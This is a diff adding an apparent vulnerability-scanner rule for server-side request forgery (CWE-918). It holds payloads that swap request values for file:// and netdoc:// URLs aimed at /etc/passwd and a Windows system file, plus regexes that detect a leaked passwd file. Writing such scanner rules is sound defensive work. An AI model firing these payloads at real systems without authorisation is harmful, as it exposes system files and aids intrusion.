@@ -1,0 +1,21 @@
+generate:
+  - payload:
+    - 'netdoc:///etc/passwd'
+    - 'file:///etc/passwd'
+    - 'file://c:\windows\system32\drivers\etc\networks'
+  - method:
+    - replace
+detect:
+  - response:
+    - body: '#    campus       284.122.107'
+    - body: '[a-z]*:[^:]*:[0-9]*:[0-9]*:[^:]*:\/[^:]*:\/[^:]*'
+meta-info:
+  - type: rce
+  - threat: 70
+  - title: "Server Side Request Forgery (SSRF)"
+  - description: "The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal, etc)."
+  - applicable_for: ["attack_rechecker"]
+  - tags:
+    - SSRF
+    - Server Side Request Forgery
+    - CWE-918
